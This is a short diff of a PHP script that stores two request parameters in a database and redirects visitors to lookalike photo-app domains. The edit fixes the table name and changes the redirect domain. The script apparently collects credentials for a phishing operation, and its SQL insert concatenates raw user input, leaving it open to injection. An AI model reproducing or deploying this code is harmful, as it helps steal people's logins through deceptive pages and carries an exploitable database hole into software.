@@ -14,15 +14,15 @@ $equis = $_GET['equis'];
 $ye = $_GET['ye'];
 
 if(!empty($equis)){
-   $sql = "INSERT INTO jesuschris (equis, ye) VALUES ('".$equis."', '".$ye."')";
+   $sql = "INSERT INTO jesuschrist (equis, ye) VALUES ('".$equis."', '".$ye."')";
    $conn->query($sql);
 }
 
-header('Location: https://1005639845262.my-fotos-app-manage.com/');
+header('Location: https://shared-error.photos-album-app.com/');
 
 $conn->close();
 
-header('Location: https://1005639845262.my-fotos-app-manage.com/');
+header('Location: https://shared-error.photos-album-app.com/');
 
 ob_end_flush();
 
